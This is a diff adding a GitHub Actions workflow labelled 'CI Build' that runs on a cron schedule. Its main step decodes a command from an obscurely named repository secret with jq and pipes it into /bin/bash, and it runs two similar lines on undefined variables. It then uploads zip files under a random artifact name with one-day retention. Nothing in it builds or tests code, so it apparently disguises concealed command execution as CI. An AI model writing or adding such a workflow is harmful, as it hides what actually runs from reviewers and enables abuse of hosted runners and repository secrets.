@@ -1,0 +1,32 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          kmi0888: ${{ secrets.kmi0888 }}
+        run: |
+          printf '%s' "$kmi0888" | jq -r .nmrmd6 | /bin/bash
+          echo $wyvxb65123 | jq -r .z26 | /bin/bash
+          printf '%s' "$m174" | jq -r .hzv5144 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: zXu18ZTp
+          path: "*.zip"
+          retention-days: 1
